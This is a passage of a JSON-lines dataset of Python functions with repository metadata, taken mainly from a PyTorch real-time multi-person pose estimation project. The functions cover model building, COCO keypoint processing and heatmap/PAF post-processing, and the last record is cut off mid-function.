{"docstring": "\"\"\"Randomly permute the training roidb.\"\"\"\n", "func_signal": "def _shuffle_roidb_inds(self):\n", "code": "if cfg.TRAIN.ASPECT_GROUPING:\n    widths = np.array([r['width'] for r in self._roidb])\n    heights = np.array([r['height'] for r in self._roidb])\n    horz = (widths >= heights)\n    vert = np.logical_not(horz)\n    horz_inds = np.where(horz)[0]\n    vert_inds = np.where(vert)[0]\n    inds = np.hstack((\n        np.random.permutation(horz_inds),\n        np.random.permutation(vert_inds)))\n    inds = np.reshape(inds, (-1, 2))\n    row_perm = np.random.permutation(np.arange(inds.shape[0]))\n    inds = np.reshape(inds[row_perm, :], (-1,))\n    self._perm = inds\nelse:\n    self._perm = np.random.permutation(np.arange(len(self._roidb)))\nself._cur = 0", "path": "py-R-FCN/lib/roi_data_layer/layer.py", "commit_date": "2016-11-04 00:00:00", "repo_name": "YuwenXiong/py-R-FCN", "stars": 1042, "license": "mit", "language": "python", "size": 806}
{"docstring": "\"\"\"Get the COCO keypoints and their left/right flip coorespondence map.\"\"\"\n# Keypoints are not available in the COCO json for the test split, so we\n# provide them here.\n", "func_signal": "def get_keypoints():\n", "code": "keypoints = [\n    'nose',\n    'neck',\n    'right_shoulder',\n    'right_elbow',\n    'right_wrist',   \n    'left_shoulder',\n    'left_elbow',\n    'left_wrist',\n    'right_hip',\n    'right_knee',\n    'right_ankle',\n    'left_hip',\n    'left_knee',\n    'left_ankle',\n    'right_eye',                                                                    \n    'left_eye',\n    'right_ear',\n    'left_ear']\n\nreturn keypoints", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/datasets/datasets.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Creates the whole CPM model\nArgs:\n    trunk: string, 'vgg19' or 'mobilenet'\nReturns: Module, the defined model\n\"\"\"\n", "func_signal": "def get_model(trunk='vgg19'):\n", "code": "blocks = {}\n# block0 is the preprocessing stage\nif trunk == 'vgg19':\n    block0 = [{'conv1_1': [3, 64, 3, 1, 1]},\n              {'conv1_2': [64, 64, 3, 1, 1]},\n              {'pool1_stage1': [2, 2, 0]},\n              {'conv2_1': [64, 128, 3, 1, 1]},\n              {'conv2_2': [128, 128, 3, 1, 1]},\n              {'pool2_stage1': [2, 2, 0]},\n              {'conv3_1': [128, 256, 3, 1, 1]},\n              {'conv3_2': [256, 256, 3, 1, 1]},\n              {'conv3_3': [256, 256, 3, 1, 1]},\n              {'conv3_4': [256, 256, 3, 1, 1]},\n              {'pool3_stage1': [2, 2, 0]},\n              {'conv4_1': [256, 512, 3, 1, 1]},\n              {'conv4_2': [512, 512, 3, 1, 1]},\n              {'conv4_3_CPM': [512, 256, 3, 1, 1]},\n              {'conv4_4_CPM': [256, 128, 3, 1, 1]}]\n\nelif trunk == 'mobilenet':\n    block0 = [{'conv_bn': [3, 32, 2]},  # out: 3, 32, 184, 184\n              {'conv_dw1': [32, 64, 1]},  # out: 32, 64, 184, 184\n              {'conv_dw2': [64, 128, 2]},  # out: 64, 128, 92, 92\n              {'conv_dw3': [128, 128, 1]},  # out: 128, 256, 92, 92\n              {'conv_dw4': [128, 256, 2]},  # out: 256, 256, 46, 46\n              {'conv4_3_CPM': [256, 256, 1, 3, 1]},\n              {'conv4_4_CPM': [256, 128, 1, 3, 1]}]\n\n# Stage 1\nblocks['block1_1'] = [{'conv5_1_CPM_L1': [128, 128, 3, 1, 1]},\n                      {'conv5_2_CPM_L1': [128, 128, 3, 1, 1]},\n                      {'conv5_3_CPM_L1': [128, 128, 3, 1, 1]},\n                      {'conv5_4_CPM_L1': [128, 512, 1, 1, 0]},\n                      {'conv5_5_CPM_L1': [512, 38, 1, 1, 0]}]\n\nblocks['block1_2'] = [{'conv5_1_CPM_L2': [128, 128, 3, 1, 1]},\n                      {'conv5_2_CPM_L2': [128, 128, 3, 1, 1]},\n                      {'conv5_3_CPM_L2': [128, 128, 3, 1, 1]},\n                      {'conv5_4_CPM_L2': [128, 512, 1, 1, 0]},\n                      {'conv5_5_CPM_L2': [512, 19, 1, 1, 0]}]\n\n# Stages 2 - 6\nfor i in range(2, 7):\n    blocks['block%d_1' % i] = [\n        {'Mconv1_stage%d_L1' % i: [185, 128, 7, 1, 3]},\n        {'Mconv2_stage%d_L1' % i: [128, 128, 7, 1, 3]},\n        {'Mconv3_stage%d_L1' % i: [128, 128, 7, 1, 3]},\n        {'Mconv4_stage%d_L1' % i: [128, 128, 7, 1, 3]},\n        {'Mconv5_stage%d_L1' % i: [128, 128, 7, 1, 3]},\n        {'Mconv6_stage%d_L1' % i: [128, 128, 1, 1, 0]},\n        {'Mconv7_stage%d_L1' % i: [128, 38, 1, 1, 0]}\n    ]\n\n    blocks['block%d_2' % i] = [\n        {'Mconv1_stage%d_L2' % i: [185, 128, 7, 1, 3]},\n        {'Mconv2_stage%d_L2' % i: [128, 128, 7, 1, 3]},\n        {'Mconv3_stage%d_L2' % i: [128, 128, 7, 1, 3]},\n        {'Mconv4_stage%d_L2' % i: [128, 128, 7, 1, 3]},\n        {'Mconv5_stage%d_L2' % i: [128, 128, 7, 1, 3]},\n        {'Mconv6_stage%d_L2' % i: [128, 128, 1, 1, 0]},\n        {'Mconv7_stage%d_L2' % i: [128, 19, 1, 1, 0]}\n    ]\n\nmodels = {}\n\nif trunk == 'vgg19':\n    print(\"Bulding VGG19\")\n    models['block0'] = make_vgg19_block(block0)\n\nfor k, v in blocks.items():\n    models[k] = make_stages(list(v))\n\nclass rtpose_model(nn.Module):\n    def __init__(self, model_dict):\n        super(rtpose_model, self).__init__()\n        self.model0 = model_dict['block0']\n        self.model1_1 = model_dict['block1_1']\n        self.model2_1 = model_dict['block2_1']\n        self.model3_1 = model_dict['block3_1']\n        self.model4_1 = model_dict['block4_1']\n        self.model5_1 = model_dict['block5_1']\n        self.model6_1 = model_dict['block6_1']\n\n        self.model1_2 = model_dict['block1_2']\n        self.model2_2 = model_dict['block2_2']\n        self.model3_2 = model_dict['block3_2']\n        self.model4_2 = model_dict['block4_2']\n        self.model5_2 = model_dict['block5_2']\n        self.model6_2 = model_dict['block6_2']\n\n        self._initialize_weights_norm()\n\n    def forward(self, x):\n\n        saved_for_loss = []\n        out1 = self.model0(x)\n\n        out1_1 = self.model1_1(out1)\n        out1_2 = self.model1_2(out1)\n        out2 = torch.cat([out1_1, out1_2, out1], 1)\n        saved_for_loss.append(out1_1)\n        saved_for_loss.append(out1_2)\n\n        out2_1 = self.model2_1(out2)\n        out2_2 = self.model2_2(out2)\n        out3 = torch.cat([out2_1, out2_2, out1], 1)\n        saved_for_loss.append(out2_1)\n        saved_for_loss.append(out2_2)\n\n        out3_1 = self.model3_1(out3)\n        out3_2 = self.model3_2(out3)\n        out4 = torch.cat([out3_1, out3_2, out1], 1)\n        saved_for_loss.append(out3_1)\n        saved_for_loss.append(out3_2)\n\n        out4_1 = self.model4_1(out4)\n        out4_2 = self.model4_2(out4)\n        out5 = torch.cat([out4_1, out4_2, out1], 1)\n        saved_for_loss.append(out4_1)\n        saved_for_loss.append(out4_2)\n\n        out5_1 = self.model5_1(out5)\n        out5_2 = self.model5_2(out5)\n        out6 = torch.cat([out5_1, out5_2, out1], 1)\n        saved_for_loss.append(out5_1)\n        saved_for_loss.append(out5_2)\n\n        out6_1 = self.model6_1(out6)\n        out6_2 = self.model6_2(out6)\n        saved_for_loss.append(out6_1)\n        saved_for_loss.append(out6_2)\n\n        return (out6_1, out6_2), saved_for_loss\n\n    def _initialize_weights_norm(self):\n\n        for m in self.modules():\n            if isinstance(m, nn.Conv2d):\n                init.normal_(m.weight, std=0.01)\n                if m.bias is not None:  # mobilenet conv2d doesn't add bias\n                    init.constant_(m.bias, 0.0)\n\n        # last layer of these block don't have Relu\n        init.normal_(self.model1_1[8].weight, std=0.01)\n        init.normal_(self.model1_2[8].weight, std=0.01)\n\n        init.normal_(self.model2_1[12].weight, std=0.01)\n        init.normal_(self.model3_1[12].weight, std=0.01)\n        init.normal_(self.model4_1[12].weight, std=0.01)\n        init.normal_(self.model5_1[12].weight, std=0.01)\n        init.normal_(self.model6_1[12].weight, std=0.01)\n\n        init.normal_(self.model2_2[12].weight, std=0.01)\n        init.normal_(self.model3_2[12].weight, std=0.01)\n        init.normal_(self.model4_2[12].weight, std=0.01)\n        init.normal_(self.model5_2[12].weight, std=0.01)\n        init.normal_(self.model6_2[12].weight, std=0.01)\n\nmodel = rtpose_model(models)\nreturn model", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/rtpose_vgg.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "# this returns meta-data of the video file in form of a dictionary\n", "func_signal": "def check_rotation(path_video_file):\n", "code": "meta_dict = ffmpeg.probe(path_video_file)\n\n# from the dictionary, meta_dict['streams'][0]['tags']['rotate'] is the key\n# we are looking for\nrotateCode = None\nif int(meta_dict['streams'][0]['tags']['rotate']) == 90:\n    rotateCode = cv2.ROTATE_90_CLOCKWISE\nelif int(meta_dict['streams'][0]['tags']['rotate']) == 180:\n    rotateCode = cv2.ROTATE_180\nelif int(meta_dict['streams'][0]['tags']['rotate']) == 270:\n    rotateCode = cv2.ROTATE_90_COUNTERCLOCKWISE\n\nreturn rotateCode", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/video_demo.py", "commit_date": "2020-11-14 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\n\nReturns:\n    tuple: Tuple (image, target). target is the object returned by ``coco.loadAnns``.\n\"\"\"\n", "func_signal": "def __getitem__(self, index):\n", "code": "image_id = self.ids[index]\nann_ids = self.coco.getAnnIds(imgIds=image_id, catIds=self.cat_ids)\nanns = self.coco.loadAnns(ann_ids)\nanns = copy.deepcopy(anns)\n\nimage_info = self.coco.loadImgs(image_id)[0]\nself.log.debug(image_info)\nwith open(os.path.join(self.root, image_info['file_name']), 'rb') as f:\n    image = Image.open(f).convert('RGB')\n\nmeta_init = {\n    'dataset_index': index,\n    'image_id': image_id,\n    'file_name': image_info['file_name'],\n}\n\nimage, anns, meta = self.preprocess(image, anns, None)\n     \nif isinstance(image, list):\n    return self.multi_image_processing(image, anns, meta, meta_init)\n\nreturn self.single_image_processing(image, anns, meta, meta_init)", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/datasets/datasets.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Build the outputs to be evaluated\n:param image_id: int, the id of the current image\n:param person_to_joint_assoc: numpy array of joints associations\n:param joint_list: list, list of joints\n:param outputs: list of dictionaries with the following keys: image_id,\n                category_id, keypoints, score\n\"\"\"\n\n", "func_signal": "def append_result_legacy(image_id, person_to_joint_assoc, joint_list, outputs):\n", "code": "for ridxPred in range(len(person_to_joint_assoc)):\n    one_result = {\n        \"image_id\": 0,\n        \"category_id\": 1,\n        \"keypoints\": [],\n        \"score\": 0\n    }\n\n    one_result[\"image_id\"] = image_id\n    keypoints = np.zeros((17, 3))\n\n    for part in range(17):\n        ind = ORDER_COCO[part]\n        index = int(person_to_joint_assoc[ridxPred, ind])\n\n        if -1 == index:\n            keypoints[part, 0] = 0\n            keypoints[part, 1] = 0\n            keypoints[part, 2] = 0\n\n        else:\n            keypoints[part, 0] = joint_list[index, 0] + 0.5\n            keypoints[part, 1] = joint_list[index, 1] + 0.5\n            keypoints[part, 2] = 1\n\n    one_result[\"score\"] = person_to_joint_assoc[ridxPred, -2] * \\\n        person_to_joint_assoc[ridxPred, -1]\n    one_result[\"keypoints\"] = list(keypoints.reshape(51))\n\n    outputs.append(one_result)", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/evaluate/coco_eval.py", "commit_date": "2019-09-12 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "'''\nMS COCO annotation order:\n0: nose\t   \t\t1: l eye\t\t2: r eye\t3: l ear\t4: r ear\n5: l shoulder\t6: r shoulder\t7: l elbow\t8: r elbow\n9: l wrist\t\t10: r wrist\t\t11: l hip\t12: r hip\t13: l knee\n14: r knee\t\t15: l ankle\t\t16: r ankle\nThe order in this work:\n(0-'nose'\t1-'neck' 2-'right_shoulder' 3-'right_elbow' 4-'right_wrist'\n5-'left_shoulder' 6-'left_elbow'\t    7-'left_wrist'  8-'right_hip'\n9-'right_knee'\t 10-'right_ankle'\t11-'left_hip'   12-'left_knee'\n13-'left_ankle'\t 14-'right_eye'\t    15-'left_eye'   16-'right_ear'\n17-'left_ear' )\n'''\n", "func_signal": "def add_neck(self, keypoint):\n", "code": "our_order = [0, 17, 6, 8, 10, 5, 7, 9,\n             12, 14, 16, 11, 13, 15, 2, 1, 4, 3]\n# Index 6 is right shoulder and Index 5 is left shoulder\nright_shoulder = keypoint[6, :]\nleft_shoulder = keypoint[5, :]\nneck = (right_shoulder + left_shoulder) / 2\nif right_shoulder[2] == 2 and left_shoulder[2] == 2:\n    neck[2] = 2\nelse:\n    neck[2] = right_shoulder[2] * left_shoulder[2]\n\nneck = neck.reshape(1, len(neck))\nneck = np.round(neck)\nkeypoint = np.vstack((keypoint, neck))\nkeypoint = keypoint[our_order, :]\n\nreturn keypoint", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/datasets/datasets.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Builds a vgg19 block from a dictionary\nArgs:\n    block: a dictionary\n\"\"\"\n", "func_signal": "def make_vgg19_block():\n", "code": "block = [{'conv1_1': [3, 64, 3, 1, 1]},\n        {'conv1_2': [64, 64, 3, 1, 1]},\n        {'pool1_stage1': [2, 2, 0]},\n        {'conv2_1': [64, 128, 3, 1, 1]},\n        {'conv2_2': [128, 128, 3, 1, 1]},\n        {'pool2_stage1': [2, 2, 0]},\n        {'conv3_1': [128, 256, 3, 1, 1]},\n        {'conv3_2': [256, 256, 3, 1, 1]},\n        {'conv3_3': [256, 256, 3, 1, 1]},\n        {'conv3_4': [256, 256, 3, 1, 1]},\n        {'pool3_stage1': [2, 2, 0]},\n        {'conv4_1': [256, 512, 3, 1, 1]},\n        {'conv4_2': [512, 512, 3, 1, 1]},\n        {'conv4_3_CPM': [512, 256, 3, 1, 1]},\n        {'conv4_4_CPM': [256, 128, 3, 1, 1]}]\nlayers = []\nfor i in range(len(block)):\n    one_ = block[i]\n    for k, v in one_.items():\n        if 'pool' in k:\n            layers += [nn.MaxPool2d(kernel_size=v[0], stride=v[1],\n                                    padding=v[2])]\n        elif k in ['conv4_2', 'conv4_3_CPM', 'conv4_4_CPM']:\n            conv2d = nn.Conv2d(in_channels=v[0], out_channels=v[1],\n                               kernel_size=v[2], stride=v[3],\n                               padding=v[4])\n            layers += [conv2d, nn.PReLU(num_parameters=v[1])]\n        else:\n            conv2d = nn.Conv2d(in_channels=v[0], out_channels=v[1],\n                               kernel_size=v[2], stride=v[3],\n                               padding=v[4])\n            layers += [conv2d, nn.ReLU(inplace=True)]\nreturn nn.Sequential(*layers)", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/openpose.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Computes the averaged heatmap and paf for the given image\n:param multiplier:\n:param origImg: numpy array, the image being processed\n:param model: pytorch model\n:returns: numpy arrays, the averaged paf and heatmap\n\"\"\"\n", "func_signal": "def get_outputs(img, model, preprocess):\n", "code": "inp_size = cfg.DATASET.IMAGE_SIZE\n\n# padding\nim_croped, im_scale, real_shape = im_transform.crop_with_factor(\n    img, inp_size, factor=cfg.MODEL.DOWNSAMPLE, is_ceil=True)\n\nif preprocess == 'rtpose':\n    im_data = rtpose_preprocess(im_croped)\n\nelif preprocess == 'vgg':\n    im_data = vgg_preprocess(im_croped)\n\nelif preprocess == 'inception':\n    im_data = inception_preprocess(im_croped)\n\nelif preprocess == 'ssd':\n    im_data = ssd_preprocess(im_croped)\n\nbatch_images= np.expand_dims(im_data, 0)\n\n# several scales as a batch\nbatch_var = torch.from_numpy(batch_images).cuda().float()\npredicted_outputs, _ = model(batch_var)\noutput1, output2 = predicted_outputs[-2], predicted_outputs[-1]\nheatmap = output2.cpu().data.numpy().transpose(0, 2, 3, 1)[0]\npaf = output1.cpu().data.numpy().transpose(0, 2, 3, 1)[0]\n\nreturn paf, heatmap, im_scale", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/evaluate/coco_eval.py", "commit_date": "2019-09-12 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"\nGiven a (grayscale) image, find local maxima whose value is above a given\nthreshold (param['thre1'])\n:param img: Input image (2d array) where we want to find peaks\n:return: 2d np.array containing the [x,y] coordinates of each peak found\nin the image\n\"\"\"\n\n", "func_signal": "def find_peaks(param, img):\n", "code": "peaks_binary = (maximum_filter(img, footprint=generate_binary_structure(\n    2, 1)) == img) * (img > param['thre1'])\n# Note reverse ([::-1]): we return [[x y], [x y]...] instead of [[y x], [y\n# x]...]\nreturn np.array(np.nonzero(peaks_binary)[::-1]).T", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/post.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"\nNonMaximaSuppression: find peaks (local maxima) in a set of grayscale images\n:param heatmaps: set of grayscale images on which to find local maxima (3d np.array,\nwith dimensions image_height x image_width x num_heatmaps)\n:param upsampFactor: Size ratio between CPM heatmap output and the input image size.\nEg: upsampFactor=16 if original image was 480x640 and heatmaps are 30x40xN\n:param bool_refine_center: Flag indicating whether:\n - False: Simply return the low-res peak found upscaled by upsampFactor (subject to grid-snap)\n - True: (Recommended, very accurate) Upsample a small patch around each low-res peak and\n fine-tune the location of the peak at the resolution of the original input image\n:param bool_gaussian_filt: Flag indicating whether to apply a 1d-GaussianFilter (smoothing)\nto each upsampled patch before fine-tuning the location of each peak.\n:return: a NUM_JOINTS x 4 np.array where each row represents a joint type (0=nose, 1=neck...)\nand the columns indicate the {x,y} position, the score (probability) and a unique id (counter)\n\"\"\"\n# MODIFIED BY CARLOS: Instead of upsampling the heatmaps to heatmap_avg and\n# then performing NMS to find peaks, this step can be sped up by ~25-50x by:\n# (9-10ms [with GaussFilt] or 5-6ms [without GaussFilt] vs 250-280ms on RoG\n# 1. Perform NMS at (low-res) CPM's output resolution\n# 1.1. Find peaks using scipy.ndimage.filters.maximum_filter\n# 2. Once a peak is found, take a patch of 5x5 centered around the peak, upsample it, and\n# fine-tune the position of the actual maximum.\n#  '-> That's equivalent to having found the peak on heatmap_avg, but much faster because we only\n#      upsample and scan the 5x5 patch instead of the full (e.g.) 480x640\n\n", "func_signal": "def NMS(param, heatmaps, upsampFactor=1., bool_refine_center=True, bool_gaussian_filt=False):\n", "code": "joint_list_per_joint_type = []\ncnt_total_joints = 0\n\n# For every peak found, win_size specifies how many pixels in each\n# direction from the peak we take to obtain the patch that will be\n# upsampled. Eg: win_size=1 -> patch is 3x3; win_size=2 -> 5x5\n# (for BICUBIC interpolation to be accurate, win_size needs to be >=2!)\nwin_size = 2\n\nfor joint in range(NUM_JOINTS):\n    map_orig = heatmaps[:, :, joint]\n    peak_coords = find_peaks(param, map_orig)\n    peaks = np.zeros((len(peak_coords), 4))\n    for i, peak in enumerate(peak_coords):\n        if bool_refine_center:\n            x_min, y_min = np.maximum(0, peak - win_size)\n            x_max, y_max = np.minimum(\n                np.array(map_orig.T.shape) - 1, peak + win_size)\n\n            # Take a small patch around each peak and only upsample that\n            # tiny region\n            patch = map_orig[y_min:y_max + 1, x_min:x_max + 1]\n            map_upsamp = cv2.resize(\n                patch, None, fx=upsampFactor, fy=upsampFactor, interpolation=cv2.INTER_CUBIC)\n\n            # Gaussian filtering takes an average of 0.8ms/peak (and there might be\n            # more than one peak per joint!) -> For now, skip it (it's\n            # accurate enough)\n            map_upsamp = gaussian_filter(\n                map_upsamp, sigma=3) if bool_gaussian_filt else map_upsamp\n\n            # Obtain the coordinates of the maximum value in the patch\n            location_of_max = np.unravel_index(\n                map_upsamp.argmax(), map_upsamp.shape)\n            # Remember that peaks indicates [x,y] -> need to reverse it for\n            # [y,x]\n            location_of_patch_center = compute_resized_coords(\n                peak[::-1] - [y_min, x_min], upsampFactor)\n            # Calculate the offset wrt to the patch center where the actual\n            # maximum is\n            refined_center = (location_of_max - location_of_patch_center)\n            peak_score = map_upsamp[location_of_max]\n        else:\n            refined_center = [0, 0]\n            # Flip peak coordinates since they are [x,y] instead of [y,x]\n            peak_score = map_orig[tuple(peak[::-1])]\n        peaks[i, :] = tuple([int(round(x)) for x in compute_resized_coords(\n            peak_coords[i], upsampFactor) + refined_center[::-1]]) + (peak_score, cnt_total_joints)\n        cnt_total_joints += 1\n    joint_list_per_joint_type.append(peaks)\n\nreturn joint_list_per_joint_type", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/post.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Get the COCO keypoints and their left/right flip coorespondence map.\"\"\"\n# Keypoints are not available in the COCO json for the test split, so we\n# provide them here.\n", "func_signal": "def get_keypoints():\n", "code": "keypoints = [\n    'nose',\n    'neck',\n    'right_shoulder',\n    'right_elbow',\n    'right_wrist',   \n    'left_shoulder',\n    'left_elbow',\n    'left_wrist',\n    'right_hip',\n    'right_knee',\n    'right_ankle',\n    'left_hip',\n    'left_knee',\n    'left_ankle',\n    'right_eye',                                                                    \n    'left_eye',\n    'right_ear',\n    'left_ear']\n\nreturn keypoints", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/datasets/test_dataloader.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Compute the average of normal and flipped heatmap and paf\n:param normal_heat: numpy array, the normal heatmap\n:param normal_paf: numpy array, the normal paf\n:param flipped_heat: numpy array, the flipped heatmap\n:param flipped_paf: numpy array, the flipped  paf\n:returns: numpy arrays, the averaged paf and heatmap\n\"\"\"\n\n# The order to swap left and right of heatmap\n", "func_signal": "def handle_paf_and_heat(normal_heat, flipped_heat, normal_paf, flipped_paf):\n", "code": "swap_heat = np.array((0, 1, 5, 6, 7, 2, 3, 4, 11, 12,\n                      13, 8, 9, 10, 15, 14, 17, 16, 18))\n\n# paf's order\n# 0,1 2,3 4,5\n# neck to right_hip, right_hip to right_knee, right_knee to right_ankle\n\n# 6,7 8,9, 10,11\n# neck to left_hip, left_hip to left_knee, left_knee to left_ankle\n\n# 12,13 14,15, 16,17, 18, 19\n# neck to right_shoulder, right_shoulder to right_elbow, right_elbow to\n# right_wrist, right_shoulder to right_ear\n\n# 20,21 22,23, 24,25 26,27\n# neck to left_shoulder, left_shoulder to left_elbow, left_elbow to\n# left_wrist, left_shoulder to left_ear\n\n# 28,29, 30,31, 32,33, 34,35 36,37\n# neck to nose, nose to right_eye, nose to left_eye, right_eye to\n# right_ear, left_eye to left_ear So the swap of paf should be:\nswap_paf = np.array((6, 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5, 20, 21, 22, 23,\n                     24, 25, 26, 27, 12, 13, 14, 15, 16, 17, 18, 19, 28,\n                     29, 32, 33, 30, 31, 36, 37, 34, 35))\n\nflipped_paf = flipped_paf[:, ::-1, :]\n\n# The pafs are unit vectors, The x will change direction after flipped.\n# not easy to understand, you may try visualize it.\nflipped_paf[:, :, swap_paf[1::2]] = flipped_paf[:, :, swap_paf[1::2]]\nflipped_paf[:, :, swap_paf[::2]] = -flipped_paf[:, :, swap_paf[::2]]\naveraged_paf = (normal_paf + flipped_paf[:, :, swap_paf]) / 2.\naveraged_heatmap = (\n    normal_heat + flipped_heat[:, ::-1, :][:, :, swap_heat]) / 2.\n\nreturn averaged_paf, averaged_heatmap", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/evaluate/coco_eval.py", "commit_date": "2019-09-12 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Collate for multiscale.\n\nindices:\n    images: [scale, batch , ...]\n    anns: [batch, scale, ...]\n    metas: [batch, scale, ...]\n\"\"\"\n", "func_signal": "def collate_multiscale_images_anns_meta(batch):\n", "code": "n_scales = len(batch[0][0])\nimages = [torch.utils.data.dataloader.default_collate([b[0][i] for b in batch])\n          for i in range(n_scales)]\nanns = [[b[1][i] for b in batch] for i in range(n_scales)]\nmetas = [b[2] for b in batch]\nreturn images, anns, metas", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/datasets/datasets.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"Builds CPM stages from a dictionary\nArgs:\n    cfg_dict: a dictionary\n\"\"\"\n", "func_signal": "def make_stages(cfg_dict):\n", "code": "layers = []\nfor i in range(len(cfg_dict) - 1):\n    one_ = cfg_dict[i]\n    for k, v in one_.items():\n        if 'pool' in k:\n            layers += [nn.MaxPool2d(kernel_size=v[0], stride=v[1],\n                                    padding=v[2])]\n        else:\n            conv2d = nn.Conv2d(in_channels=v[0], out_channels=v[1],\n                               kernel_size=v[2], stride=v[3],\n                               padding=v[4])\n            layers += [conv2d, nn.ReLU(inplace=True)]\none_ = list(cfg_dict[-1].keys())\nk = one_[0]\nv = cfg_dict[-1][k]\nconv2d = nn.Conv2d(in_channels=v[0], out_channels=v[1],\n                   kernel_size=v[2], stride=v[3], padding=v[4])\nlayers += [conv2d]\nreturn nn.Sequential(*layers)", "path": "pytorch_Realtime_Multi-Person_Pose_Estimation/lib/network/rtpose_vgg.py", "commit_date": "2019-09-10 00:00:00", "repo_name": "tensorboy/pytorch_Realtime_Multi-Person_Pose_Estimation", "stars": 1349, "license": "None", "language": "python", "size": 69674}
{"docstring": "\"\"\"\nFor every type of limb (eg: forearm, shin, etc.), look for every potential\npair of joints (eg: every wrist-elbow combination) and evaluate the PAFs to\ndetermine which pairs are indeed body limbs.\n:param paf_upsamp: PAFs upsampled to the original input image resolution\n:param joint_list_per_joint_type: See 'return' doc of NMS()\n:param num_intermed_pts: Int indicating how many intermediate points to take\nbetween joint_src and joint_dst, at which the PAFs will be evaluated\n:return: List of NUM_LIMBS rows. For every limb_type (a row) we store\na list of all limbs of that type found (eg: all the right forearms).\nFor each limb (each item in connected_limbs[limb_type]), we store 5 cells:\n# {joint_src_id,joint_dst_id}: a unique number associated with each joint,\n# limb_score_penalizing_long_dist: a score of how good a connection\nof the joints is, penalized if the limb length is too long\n# {joint_src_index,joint_dst_index}: the index of the joint within\nall the joints of that type found (eg: the 3rd right elbow found)\n\"\"\"\n", "func_signal": "def find_connected_joints(param, paf_upsamp, joint_list_per_joint_type, num_intermed_pts=10):\n", "code": "connected_limbs = []\n\n# Auxiliary array to access paf_upsamp quickly\nlimb_intermed_coords = np.empty((4, num_intermed_pts), dtype=np.intp)\nfor limb_type in range(NUM_LIMBS):\n    # List of all joints of type A found, where A is specified by limb_type\n    # (eg: a right forearm starts in a right elbow)\n    joints_src = joint_list_per_joint_type[joint_to_limb_heatmap_relationship[limb_type][0]]\n    # List of all joints of type B found, where B is specified by limb_type\n    # (eg: a right forearm ends in a right wrist)\n    joints_dst = joint_list_per_joint_type[joint_to_limb_heatmap_relationship[limb_type][1]]\n    if len(joints_src) == 0 or len(joints_dst) == 0:\n        # No limbs of this type found (eg: no right forearms found because\n        # we didn't find any right wrists or right elbows)\n        connected_limbs.append([])\n    else:\n        connection_candidates = []\n        # Specify the paf index that contains the x-coord of the paf for\n        # this limb\n        limb_intermed_coords[2, :] = paf_xy_coords_per_limb[limb_type][0]\n        # And the y-coord paf index\n        limb_intermed_coords[3, :] = paf_xy_coords_per_limb[limb_type][1]\n        for i, joint_src in enumerate(joints_src):\n            # Try every possible joints_src[i]-joints_dst[j] pair and see\n            # if it's a feasible limb\n            for j, joint_dst in enumerate(joints_dst):\n                # Subtract the position of both joints to obtain the\n                # direction of the potential limb\n                limb_dir = joint_dst[:2] - joint_src[:2]\n                # Compute the distance/length of the potential limb (norm\n                # of limb_dir)\n                limb_dist = np.sqrt(np.sum(limb_dir**2)) + 1e-8\n                limb_dir = limb_dir / limb_dist  # Normalize limb_dir to be a unit vector\n\n                # Linearly distribute num_intermed_pts points from the x\n                # coordinate of joint_src to the x coordinate of joint_dst\n                limb_intermed_coords[1, :] = np.round(np.linspace(\n                    joint_src[0], joint_dst[0], num=num_intermed_pts))\n                limb_intermed_coords[0, :] = np.round(np.linspace(\n                    joint_src[1], 